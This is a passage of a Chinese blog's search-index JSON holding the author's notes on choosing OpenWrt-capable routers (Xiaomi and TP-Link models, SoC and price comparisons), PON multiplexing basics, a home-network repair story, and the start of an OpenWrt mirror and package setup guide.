\u5728\u4ee5\u592a\u7f51\u73af\u5883\u4e0b\u66f4\u6613\u4e8e\u90e8\u7f72\u548c\u7ba1\u7406\uff0c\u9002\u7528\u4e8e\u4ee5\u592a\u7f51\u4f18\u5148\u7684\u7f51\u7edc\u7ed3\u6784\u3002</li> </ul> </li> <li>GPON<ul> <li>\u662f XG-PON \u7684\u524d\u4e00\u4ee3\uff0c\u63d0\u4f9b\u4e0b\u884c 2.5 Gbps \u548c\u4e0a\u884c 1.25 Gbps \u7684\u5e26\u5bbd\u3002</li> <li>\u4f7f\u7528\u4e86 TDM\uff08\u65f6\u5206\u590d\u7528\uff09\u6280\u672f\u5171\u4eab\u5e26\u5bbd\uff0c\u5e76\u5728\u5168\u7403\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5149\u7ea4\u5230\u6237\uff08FTTH\uff09\u63a5\u5165\u3002</li> </ul> </li> </ul> <p>\u65f6\u5206\u590d\u7528</p> <p>GPON \u4f7f\u7528 TDM\uff08\u65f6\u5206\u590d\u7528, Time Division Multiplexing\uff09 \u6280\u672f\u6765\u4f20\u8f93\u6570\u636e\u3002\u5728 GPON \u4e2d\uff0cOLT\uff08\u5149\u7ebf\u8def\u7ec8\u7aef\uff09\u4ee5\u56fa\u5b9a\u7684\u65f6\u95f4\u7247\u5c06\u6570\u636e\u4f20\u9001\u5230\u4e0d\u540c\u7684\u7528\u6237\u8bbe\u5907\uff08ONT/ONU\uff09\u3002</p> <p>EPON \u4f7f\u7528 TDMA\uff08\u65f6\u5206\u591a\u5740, Time Division Multiple Access\uff09 \u590d\u7528\u6280\u672f\uff0c\u8fd9\u4e0e GPON \u7684 TDM \u6709\u7c7b\u4f3c\u7684\u6982\u5ff5\uff0c\u4f46\u5728\u4f20\u8f93\u5c42\u9762\u66f4\u52a0\u57fa\u4e8e\u4ee5\u592a\u7f51\u534f\u8bae\u3002</p> <p>\u5176\u5b83\u590d\u7528</p> <ul> <li>\u9891\u5206\u590d\u7528\uff08FDM, Frequency Division Multiplexing\uff09\uff1a<ul> <li>FDM \u901a\u8fc7\u5c06\u4fe1\u53f7\u5206\u914d\u5230\u4e0d\u540c\u7684\u9891\u7387\u8303\u56f4\uff08\u9891\u5e26\uff09\u4e0a\u6765\u5b9e\u73b0\u591a\u4e2a\u4fe1\u53f7\u7684\u5e76\u884c\u4f20\u8f93\u3002\u6bcf\u4e2a\u7528\u6237\u5360\u636e\u4e0d\u540c\u7684\u9891\u7387\u6bb5\uff0c\u4e0d\u540c\u9891\u7387\u7684\u4fe1\u53f7\u53ef\u4ee5\u540c\u65f6\u4f20\u8f93\u3002</li> <li>\u65e0\u7ebf\u901a\u4fe1\uff08\u5982 AM/FM \u5e7f\u64ad\uff09\u3001\u6709\u7ebf\u7535\u89c6\u3001DSL \u7b49\u3002</li> </ul> </li> <li>\u7801\u5206\u590d\u7528\uff08CDMA, Code Division Multiple Access\uff09\uff1a<ul> <li>CDMA \u901a\u8fc7\u4e3a\u6bcf\u4e2a\u7528\u6237\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u7f16\u7801\uff0c\u5c06\u6240\u6709\u7528\u6237\u7684\u6570\u636e\u6df7\u5408\u5728\u4e00\u8d77\u8fdb\u884c\u4f20\u8f93\u3002\u63a5\u6536\u7aef\u6839\u636e\u7279\u5b9a\u7684\u7f16\u7801\u5206\u79bb\u51fa\u5c5e\u4e8e\u81ea\u5df1\u7684\u4fe1\u53f7\u3002</li> </ul> </li> <li>\u6b63\u4ea4\u9891\u5206\u590d\u7528\uff08OFDM, Orthogonal Frequency Division Multiplexing\uff09<ul> <li>OFDM \u662f FDM \u7684\u4e00\u79cd\u7279\u6b8a\u5f62\u5f0f\uff0c\u901a\u8fc7\u5c06\u6570\u636e\u5206\u5272\u6210\u591a\u4e2a\u5b50\u8f7d\u6ce2\uff0c\u6bcf\u4e2a\u5b50\u8f7d\u6ce2\u4ee5\u6b63\u4ea4\u7684\u65b9\u5f0f\u8fdb\u884c\u4f20\u8f93\uff0c\u907f\u514d\u9891\u7387\u95f4\u7684\u5e72\u6270\u3002\u6bcf\u4e2a\u5b50\u8f7d\u6ce2\u4e0a\u643a\u5e26\u90e8\u5206\u6570\u636e\uff0c\u56e0\u6b64\u591a\u4e2a\u5b50\u8f7d\u6ce2\u540c\u65f6\u4f20\u8f93\u6570\u636e\u3002</li> <li>\u793a\u4f8b\uff1aWi-Fi\uff08802.11 a/g/n/ac\uff09\u30014G LTE\u3001\u6570\u5b57\u7535\u89c6\u3002</li> </ul> </li> <li>\u6ce2\u5206\u590d\u7528\uff08WDM, Wavelength Division Multiplexing\uff09<ul> <li>WDM \u662f\u9891\u5206\u590d\u7528\u7684\u4e00\u79cd\u7279\u4f8b\uff0c\u5e94\u7528\u4e8e\u5149\u7ea4\u901a\u4fe1\u7cfb\u7edf\u4e2d\u3002\u5b83\u5c06\u4e0d\u540c\u6ce2\u957f\u7684\u5149\uff08\u5373\u4e0d\u540c\u989c\u8272\u7684\u5149\uff09\u4f5c\u4e3a\u4e0d\u540c\u7684\u901a\u9053\uff0c\u901a\u8fc7\u540c\u4e00\u6839\u5149\u7ea4\u540c\u65f6\u4f20\u8f93\u591a\u4e2a\u5149\u4fe1\u53f7\u3002</li> </ul> </li> <li>\u7a7a\u5206\u590d\u7528\uff08SDM, Space Division Multiplexing\uff09<ul> <li>SDM \u901a\u8fc7\u5728\u7a7a\u95f4\u4e0a\u5c06\u4fe1\u53f7\u5206\u79bb\uff0c\u5b9e\u73b0\u591a\u4e2a\u4fe1\u53f7\u7684\u5e76\u884c\u4f20\u8f93\u3002\u6bcf\u4e2a\u4fe1\u53f7\u901a\u8fc7\u4e0d\u540c\u7684\u7269\u7406\u8def\u5f84\uff08\u5982\u5149\u7ea4\u6216\u5929\u7ebf\u9635\u5217\uff09\u4f20\u8f93\uff0c\u4e92\u4e0d\u5e72\u6270\u3002</li> <li>\u5149\u7ea4\u901a\u4fe1\u4e2d\u7684\u591a\u82af\u5149\u7ea4\u3001MIMO\uff08Multiple Input Multiple Output\uff09\u65e0\u7ebf\u901a\u4fe1\u6280\u672f\u3002</li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#2022-\u4e4b\u524d","title":"2022 \u4e4b\u524d","text":"<p>\u5982\u4f55\u9009\u62e9\u4e00\u4e2a\u53ef\u4ee5\u5237 openwrt \u7684\u8def\u7531\u5668\uff1f</p> <ul> <li>\u8001\u623f\u5b50 WiFi \u5e03\u7f51\u653b\u7565 \u7bc7\u4e09\u5341\u516b\uff1aWiFi 6 \u6885\u6797\u6216 openwrt \u56fa\u4ef6\u8def\u7531\u5668\u5165\u624b\u6307\u5357_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</li> <li>\u8001\u623f\u5b50 WiFi \u5e03\u7f51\u653b\u7565 \u7bc7\u4e8c\u5341\u56db\uff1a\u4e0d\u6f0f\u6cb9\u7684\u8def\u7531\u5668\u4e0d\u662f\u597d\u77ff\u673a\uff0c\u77ff\u6e23\u8def\u7531\u5668\u76d8\u70b9_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</li> <li>\u6781\u8def\u7531\u3001\u65b0\u8def\u7531\uff1a\u673a\u7687\uff01\u51e0\u79cd\u9ad8\u6027\u4ef7\u6bd4\u77ff\u6e23\u8def\u7531\u5668\u6bd4\u8f83 - \u65b0\u624b\u5165\u95e8\u53ca\u5176\u5b83 (\u786c\u4ef6)-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#\u5c0f\u7c73\u8def\u7531\u5668\u578b\u53f7\u603b\u7ed3","title":"\u5c0f\u7c73\u8def\u7531\u5668\u578b\u53f7\u603b\u7ed3","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#cpu-\u5206\u7c7b","title":"CPU \u5206\u7c7b","text":"<ul> <li>mt7621 \u578b\u53f7<ul> <li>R3G\uff1a\u54b8\u9c7c 50 \u5143\u5de6\u53f3\uff0c\u6709 USB3.0 \u63a5\u53e3\uff0c128MB \u7684 flash\u3002</li> <li>4A \u5343\u5146\u7248\uff1a\u54b8\u9c7c 70 \u5143\u5de6\u53f3\uff0c\u5916\u89c2\u7b80\u7ea6\u6f02\u4eae\uff0c16MB NOR flash \u6709\u70b9\u5c0f\u3002</li> <li>C660x\uff1a\u54b8\u9c7c 100 \u591a\uff0c\u652f\u6301 wifi6</li> </ul> </li> <li>\u9ad8\u901a\u578b\u53f7<ul> <li>\u76ee\u524d (22.03) \u53ea\u6709 AX6S \u662f\u53d7 openwrt \u5b98\u65b9\u652f\u6301\u7684\uff0cAX6, AX3600 \u6709\u7b2c\u4e09\u65b9\u652f\u6301\u3002AX5 \u7b49\u5176\u4f59\u672a\u652f\u6301<ul> <li>\u4e0d\u80fd\u5237\u597d\u50cf\u662f linux kernel \u8fd8\u4e0d\u652f\u6301\u9ad8\u901a\u7684 IPQ SoC\u3002</li> <li>B \u7ad9\u770b\u5230\u8bf4 AX5 \u5237 openwrt \u9700\u8981\u786c\u6539\u5185\u5b58\u4e3a 1G\uff0c\u597d\u50cf\u8bf4\u9ad8\u901a\u7684 wifi \u9a71\u52a8\u975e\u5e38\u8017\u5185\u5b58</li> </ul> </li> <li>AX6S\uff1a220 \u5de6\u53f3</li> <li>AX6:250-300 \u5de6\u53f3</li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#cpu\u5bf9\u6bd4","title":"CPU\u5bf9\u6bd4","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>[\u8f6c\u8d34] \u65e0\u7ebf\u8def\u7531\u5668CPU\u6d45\u6790 MT7621A\u3001 BCM47189 \u5230\u5e95\u8c01\u5f3a\uff1f-\u65b0\u624b\u5165\u95e8\u53ca\u5176\u5b83(\u786c\u4ef6)-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</li> </ul> <ul> <li>\u6811\u8393\u6d3e\u7cfb\u5217\u5904\u7406\u5668\uff1aRaspberry Pi Documentation - Processors<ul> <li>Raspberry Pi 2 Model B\uff1a BCM2836(quad-core Cortex-A7 )</li> <li>Raspberry Pi 3 Model B\uff1aBCM2837( quad-core Cortex-A53@1.2)<ul> <li>50% faster than the Raspberry Pi 2.</li> </ul> </li> <li>Raspberry Pi 3 Models A+, B+: BCM2837B0(quad-core Cortex-A53@1.4)<ul> <li>17% faster than the original Raspberry Pi 3</li> </ul> </li> <li>Raspberry Pi 4 Model B: BCM2837(quad-core Cortex-A72@1.5 GHz)<ul> <li>50% faster than the Raspberry Pi 3B+</li> </ul> </li> </ul> </li> </ul> <ul> <li>ARM\u6838\u5bf9\u6bd4\uff1aList of ARM processors - Wikipedia<ul> <li>Cortex-A7: 1.9 DMIPS/MHz per core</li> <li>A53: 2.3 DMIPS/MHz</li> <li>A72: 6.3-7.3 DMIPS/MHz</li> </ul> </li> <li>MIPS\u6838\uff1aMIPS Classic Processor Cores - Imagination Technologies<ul> <li>1004K: 1.6 DMIPS/MHz</li> </ul> </li> <li>74k: 1.93 DMIPS/MHz\uff1aCSAC\u8def\u7531\u5668\uff1a71</li> </ul> <ul> <li>newifi3-d2-firmware/README.md at master \u00b7 sawaYch/newifi3-d2-firmware (github.com)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#\u5c0f\u7c73\u7cfb\u5217\u4ea7\u54c1","title":"\u5c0f\u7c73\u7cfb\u5217\u4ea7\u54c1","text":"<ul> <li>\u7ea2\u7c73 AX5\uff0c\u5c0f\u7c73 AX1800 \u6362\u76ae<ul> <li>IPQ6000, 4 \u6838 A53@1.2Ghz\uff1a[OpenWrt Wiki] Xiaomi AX1800 (AX5/RA67)</li> </ul> </li> </ul> <ul> <li>\u7ea2\u7c73AX6\uff0c\u5c0f\u7c73AX3600\u6362\u76ae<ul> <li>AX6, IPQ8071A@1.4GHz, 512(ram) + 128\uff1a[OpenWrt Wiki] Xiaomi Redmi AX6 Wi-Fi 6 Mesh Router</li> <li>AX3600, IPQ8071A, 512 + 256\uff1a[OpenWrt Wiki] Xiaomi AX3600</li> <li>\u5bf9\u6bd4\uff1a\u7ea2\u7c73AX6\u62c6\u673a\uff0c\u65e7\u6b3eWIFI6\u65e0\u7ebf\u8def\u7531\u5668-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> </ul> </li> <li>AX3000<ul> <li>\u7ea2\u7c73AX3000\uff08\u6bd4\u8f83\u5e38\u89c1\uff09\uff0cIPQ5000\uff1a\u53cc\u6838A53@1.0GHz, 256(ram) + 128\uff1aRedmi\u8def\u7531\u5668AX3000\u7acb\u5373\u8d2d\u4e70-\u5c0f\u7c73\u5546\u57ce</li> <li>\u5c0f\u7c73AX3000\uff1aIPQ5000\uff1a\u53cc\u6838A53@1.0GHz, 256(ram) + 128\uff1a\u5c0f\u7c73\u8def\u7531\u5668AX3000\u7acb\u5373\u8d2d\u4e70-\u5c0f\u7c73\u5546\u57ce (mi.com)</li> <li>\u7ea2\u7c73AX3000\u6a21\u5177\u548cAX6S\u4e00\u6837\uff0c\u4e3a\u767d\u8272\u3002\u5c0f\u7c73AX3000\u4e3a\u9ed1\u8272\u56db\u68f1\u67f1\u3002</li> </ul> </li> <li>AX5400<ul> <li>\u7ea2\u7c73AX5400\uff0cIPQ5018\uff1a\u53cc\u6838A53@1.0GHz\uff0c512(ram) + 128\uff1a\u7ea2\u7c73AX5400\u5343\u5146\u7248\u62c6\u673a\uff0c\u770b\u770b\u4e0e\u7535\u7ade\u7248\u6709\u4ec0\u4e48\u5dee\u522b-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> </ul> </li> <li>AX6000<ul> <li>\u5c0f\u7c73AX6000<ul> <li>IPQ5018, 2\u6838A53@1.0Ghz, 512(ram) + 128</li> <li>\u4f7f\u7528\u7684SoC IPQ5018\u4e3a\u9ad8\u901a\u6c89\u6d78\u5f0f\u5bb6\u5ead\u8054\u7f51\u5e73\u53f0\uff0c\u4e0d\u5982\u9ad8\u901a\u4e13\u4e1a\u8054\u7f51\u5e73\u53f0\u7684IPQ8071A\uff08AX3600\u4e0a\u7684\uff09</li> </ul> </li> <li>\u7ea2\u7c73AX6000\uff08\u5f88\u5f3a\uff09<ul> <li>MT7986A, 4\u6838A53@2.0Ghz, 512(ram) + 128\uff1a[OpenWrt Wiki] Xiaomi Redmi AX6000</li> <li>\u7ea2\u7c73AX6000\u62c6\u673a\uff0c\u6700\u4fbf\u5b9c\u7684\u56db\u68382.0GHz-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> </ul> </li> </ul> </li> </ul> <p>\u53c2\u8003</p> <ul> <li>(33 \u5c01\u79c1\u4fe1 / 71 \u6761\u6d88\u606f) \u8def\u7531\u5668\u7ea2\u7c73ax3000\u548c\u7ea2\u7c73ax6\u9009\u62e9\u54ea\u4e2a? - \u77e5\u4e4e (zhihu.com)</li> <li>\u5c0f\u7c73openwrt\u9875\u9762\uff1a[OpenWrt Wiki] Xiaomi</li> <li>\u5e38\u89c1MediaTek SoC\uff1aMediaTek - WikiDevi.Wi-Cat.RU</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#2023-wifi6\u4ea7\u54c1","title":"2023 wifi6\u4ea7\u54c1","text":"<p>\u73b0\u5728\u9700\u6c42wifi6\uff0c\u4e14\u4fe1\u53f7\u8986\u76d6\u5e7f</p> <ul> <li>\u5c0f\u7c73wr30u\uff1a\u8fd0\u8425\u5546\u5b9a\u5236\u7248</li> <li>360 T7\uff1a\u548c\u4e0a\u8005\u786c\u4ef6\u4e00\u6478\u4e00\u6837\u300212v 1A</li> </ul> <p>wr30u: wifi6: \u5c0f\u7c73WR30U\u65e0\u7ebf\u8def\u7531\u5668\u62c6\u673a AX3000\u8054\u901a\u5b9a\u5236\u7248-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net) 2023\u5e74\u652f\u6301\u5237\u673a\u7684\u8def\u7531\u5668\u5927\u5168\uff08\u5efa\u8bae\u6536\u85cf\uff09 - \u77e5\u4e4e (zhihu.com)</p> <ul> <li>AX1800\uff1acr660x</li> <li>AX3000\uff1acr880x\uff1a135</li> </ul> <p>618 \u60f3\u4e70\u53f0\u8def\u7531\u5668\u6c42\u63a8\u8350 - V2EX 150\u7684T7 512\u6539\uff1aWR30U\u8def\u7531\u5230\u4e86\u968f\u624b\u6d4b\u6d4b - \uff30\uff23\u6570\u7801 - Stage1st - stage1/s1 \u6e38\u620f\u52a8\u6f2b\u8bba\u575b (saraba1st.com)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#2024-\u65b0\u9700\u6c42","title":"2024 \u65b0\u9700\u6c42","text":"<p>\u5bb6\u91cc\u642d\u5efa\u7684\u8f6f\u8def\u7531 + \u591a AP \u5728\u4e00\u6b21\u65ad\u7535\u540e\u4e0a\u4e0d\u4e86\u7f51\u3002\u65e0\u6cd5\u8fdc\u7a0b\u8bbf\u95ee\u65e0\u6cd5\u4fee\u590d\u3002\u7531\u4e8e\u8bbe\u7f6e\u4e86\u6865\u63a5 + \u8def\u7531\u5668\u62e8\u53f7\u3002\u6240\u4ee5\u4e5f\u65e0\u6cd5\u6307\u5bfc\u7236\u6bcd\u6362\u56de\u539f\u6765\u7684\u817e\u8fbe\u8def\u7531\u5668\u3002</p> <p>\u5e73\u65f6\u548c\u7236\u6bcd\u901a\u8bdd\u65f6\uff0c\u7236\u4eb2\u8001\u662f\u62b1\u6028\u8bf4\u7f51\u7edc\u4e0d\u597d\u3002\u5e94\u8be5\u662f\u4ed6\u603b\u662f\u8fde\u63a5\u5230\u4f4d\u7f6e\u4e0d\u5bf9\u7684 AP\uff0c\u8ba9\u4ed6\u65ad\u5f00 wifi \u91cd\u65b0\u8fde\u63a5\u4e00\u4e0b\u5f80\u5f80\u80fd\u89e3\u51b3\u95ee\u9898\u3002</p> <p>\u4e8e\u662f\u8fd9\u6b21\u51b3\u5b9a\u6362\u4e00\u4e2a\u65e0\u7ebf\u4fe1\u53f7\u597d\u7684\u8def\u7531\u5668\uff0c\u91c7\u7528\u5355\u4e2a\u8def\u7531\u5668\u7684\u65b9\u6848\u3002\u7136\u540e\u8ba9\u5bbd\u5e26\u5e08\u5085\u5e2e\u5fd9\u5b89\u88c5\u4e00\u4e0b\u3002</p> <p>\u636e\u8bf4\u7ef4\u4fee\u5f88\u66f2\u6298</p> <p>\u7531\u4e8e\u4e0d\u662f\u79fb\u52a8\u7684\u8def\u7531\u5668\uff0c\u662f\u81ea\u5df1\u7684\u8def\u7531\u5668\u7684\u95ee\u9898\uff0c\u6536\u4e86 30 \u5143\u7684\u7ef4\u4fee\u8d39\u3002\u4e2d\u5348 1 \u70b9 \u6253 10086\uff0c\u4e0b\u5348 4 \u70b9\u5c31\u6765\u7ef4\u4fee\u4e86\u8fd9\u70b9\u4e0d\u9519\u3002\u636e\u8bf4\u641e\u4e86\u5f88\u4e45\uff0c\u53ef\u80fd\u662f\u6211\u8bbe\u7f6e\u4e86\u6865\u63a5\u7684\u539f\u56e0\uff0c\u5bbd\u5e26\u5e08\u5085\u641e\u4e86\u534a\u5929\u6ca1\u641e\u5b9a\uff0c\u6700\u540e\u628a\u5149\u732b\u6362\u4e86\u4e2a\u65b0\u7684\uff08\u597d\u50cf\u8bf4\u633a\u597d\u7684\uff0c\u9002\u7528\u4e8e\u5343\u5146\u5bbd\u5e26\uff09\u6211\u4e5f\u8ba9\u4ed6\u5e2e\u5fd9\u628a\u4e00\u697c\u539f\u672c\u7684 AP \u63a5\u4e0a\u4e86\u3002\u597d\u5728 AP \u4e0d\u9700\u8981\u989d\u5916\u8bbe\u7f6e\uff0c\u63d2\u4e0a\u7f51\u7ebf\u5c31\u80fd\u7528\u3002\u731c\u6d4b\u73b0\u5728\u7f51\u7edc\u5e94\u8be5\u662f\u5149\u732b\u62e8\u53f7\uff0c\u4e3b\u8def\u7531\u5668 dhcp\uff0c\u4e5f\u5c31\u662f\u6709\u4e24\u6b21 NAT</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%89%E6%8B%A9/#\u8f6f\u8def\u7531\u505a\u65c1\u8def\u7531","title":"\u8f6f\u8def\u7531\u505a\u65c1\u8def\u7531","text":"<p>\u7ecf\u8fc7\u8fd9\u6b21\u4e8b\u4ef6\u540e\uff0c\u610f\u8bc6\u5230\u7f51\u7edc\u8fd8\u662f\u9700\u8981\u7b80\u5355\u7a33\u5b9a\u3002\u8f6f\u8def\u7531\u505a\u4e3b\u8def\u7531\u8fd9\u79cd\u65b9\u6848\u4e0d\u9002\u5408\u5bb6\u91cc\uff0c\u56e0\u4e3a\u51fa\u4e86\u95ee\u9898\uff0c\u6839\u672c\u65e0\u6cd5\u8fdc\u7a0b\u6307\u5bfc\u7236\u6bcd\u4fee\u590d\u3002\u751a\u81f3\u5bbd\u5e26\u5e08\u5085\u4e5f\u4e0d\u77e5\u9053\u600e\u4e48\u4fee\u590d\u3002\u800c\u4e14\u53ea\u8981\u95ee\u9898\u51fa\u5728\u5149\u732b\u4e0a\uff0c\u8fd0\u8425\u5546\u5c31\u53ef\u4ee5\u514d\u8d39\u7ed9\u6211\u4fee\u3002\u56e0\u6b64\u8003\u8651\u5c06\u8f6f\u8def\u7531\u4f5c\u4e3a\u65c1\u8def\u7531\u3002\u65b9\u6848\u5982\u4e0b</p> <p></p> <p></p> <p>\u9700\u6c42 - \u4ee5\u540e\u80fd\u591f\u5237 openwrt - \u65e0\u7ebf\u4fe1\u53f7\u597d\uff0c\u80fd\u591f\u8986\u76d6 100 \u5e73\u519c\u6751\u81ea\u5efa\u623f\u3002\u5149\u7ea4\u5165\u6237\u5728\u4e8c\u697c\uff0c\u56e0\u6b64\u8def\u7531\u5668\u9700\u8981\u80fd\u591f\u8986\u76d6 1 \u697c \u548c 2 \u697c\u3002 - \u6709 2.5 G \u63a5\u53e3   - \u56e0\u4e3a\u60f3\u5230\u65e2\u7136\u90fd\u5347\u7ea7\u4e86\uff0c\u9700\u8981\u628a\u6211\u8f6f\u8def\u7531 2.5 G \u53e3\u5229\u7528\u8d77\u6765   - \u5355 2.5 G \u548c\u53cc 2.5 G \u9009\u62e9     - \u7a81\u7136\u610f\u8bc6\u5230\uff0c\u5728\u6211\u7684\u8f6f\u8def\u7531\u6709 4 \u53e3 2.5 G \u7684\u60c5\u51b5\u4e0b\u3002\u5355 2.5 G \u591f\u7528\u4e86\uff0c\u5e76\u4e14\u8fd8\u4fbf\u5b9c\u5f88\u591a\u3002</p> <p>\u53d1\u73b0\u76f4\u63a5\u770b\u8fd9\u91cc\uff0c\u5c31\u6709\u63a8\u8350\u7684\u6027\u4ef7\u6bd4\u8def\u7531\u5668\uff1a\u7279\u4ef7\u8def\u7531\u6c47\u603b-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</p> <p>xdr 4288TP-LINK\u8f7b\u821fXDR4288\u62c6\u673a\uff0c\u53cc\u9891\u4e0d\u5bf9\u79f0\u7a7a\u95f4\u6d41-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</p> <p>\u4e24\u4e09\u53f0\u7ec4\u7f51\u7528\u7684\u8bdd\uff0c\u8fd9\u4e00\u53f0\u505a\u4e3b\u8def\u7531\uff0c\u4e5f\u4e0d\u9700\u8981\u591a\u5f3a\u7684\u65e0\u7ebf\u3002\u5982\u679c\u8981\u4e00\u53f0\u5168\u80fd\u5f62\u7684\uff0c\u5c31\u57286088\u548c6086\u4e4b\u95f4\u9009\u62e9\u5427\u3002\u90fd\u662f\u4f4e\u6e29\u4f4e\u70ed\u7684\uff0c\u76f8\u5bf9\u9ad8\u901aIPQ5000\u7cfb\u5217\u65b9\u6848\u7684\u673a\u578b\uff01\u4eac\u4e1c\u4ef7\u683c669\u5143\uff0c\u6309\u9700\u9009\u62e9\u5427\u3002</p> <p>xdr 6088\uff1a\u8f7b\u821fXDR6088\u62c6\u673a\uff0c\u53cc2.5G\u7f51\u53e3\u7684\u65e0\u7ebf\u8def\u7531\u5668-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net) </p> <p>xdr 5480: TP-LINK XDR5480\u62c6\u673a\uff0c\u4e3a\u5565\u6ca1\u67091G\u74f6\u9888\uff1f-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net) </p> <ul> <li>\u90fd\u8bf4 xdr 5480 \u4fe1\u53f7\u597d\u3002\u54b8\u9c7c\u4ef7\u683c 265 \uff082024/09/11\uff09\u3002\u4f46\u662f\u4e0d\u80fd\u5237 op\uff0c \u6709\u4e00\u4e2a SPF 2.5G \u53e3\uff08SPF \u6a21\u5757\u5927\u6982 50-100\u5143\uff09\u3002\u9002\u5408\u505a AP\u3002<ul> <li>IPQ5018\uff0c\u53cc\u6838A53 1GHz<ul> <li>IPQ5018\u4e0d\u96c6\u6210\u5185\u5b58\uff0c\u53ef\u4ee5\u6269\u5c55\u5185\u5b58\uff0c\u652f\u6301eMMC\uff0c\u9609\u5272\u4e00\u4e0b\uff0c\u4e0d\u53ef\u6269\u5c55\u5185\u5b58\uff0c\u4e14\u628a256MB\u5185\u5b58\u96c6\u6210\u8fdb\u53bb\uff0c\u4e5f\u628aEMMC\u53bb\u6389\uff0c\u5c31\u53d8\u6210\u4e86IPQ5010\u4e86\uff0c\u518d\u628a\u4e00\u6761PCIe\u548cUSB3.0\u53bb\u6389\uff0c\u518d\u51cf\u53bb\u84dd\u7259\u548c\u97f3\u9891\u529f\u80fd\uff0c\u5c31\u6210\u4e86IPQ5000\u3002</li> </ul> </li> <li>256(ram) + 16M</li> </ul> </li> <li>xdr6088\u3002\u54b8\u9c7c\u4ef7\u683c 419\uff082024/09/11\uff09\u3002\u67d0\u4e2a\u7248\u672c\u53ef\u4ee5\u514d\u62c6\u5237 op\u3002\u53cc 2.5G<ul> <li>7986A (4 x A53@2.0G), 512(ram)+128</li> </ul> </li> </ul> <p></p> <p>\u53c2\u8003\u8d44\u6599</p> <p>\u65e0\u7ebf\u4fe1\u53f7\u8fbe\u5230XDR5480/6088\u540c\u7ea7\u6216\u4ee5\u4e0a\u7684\u53ef\u9b54\u6539\u8def\u7531 - \u7535\u8111\u8ba8\u8bba(\u65b0) - Chiphell - \u5206\u4eab\u4e0e\u4ea4\u6d41\u7528\u6237\u4f53\u9a8c</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/","title":"openwrt \u914d\u7f6e","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#openwrt-\u6362\u6e90","title":"openwrt \u6362\u6e90","text":"<p>OpenWRT/LEDE \u6e90\u4f7f\u7528\u5e2e\u52a9 \u2014 USTC Mirror Help \u6587\u6863</p> <pre><code>sed -i 's/downloads.openwrt.org/mirrors.ustc.edu.cn\\/openwrt/g' /etc/opkg/distfeeds.conf\n</code></pre> <p>\u5e38\u7528\u8f6f\u4ef6</p> <pre><code># shell\nzsh\n# better ternminal dev\nvim-full tmux htop\n# downlaod\ncurl wget\n# networking\ntcpdump mtr-json ss ip-full iputils-arping ncat iperf3 ethtool-full\n# VPN\nluci-app-wireguard\n\n# 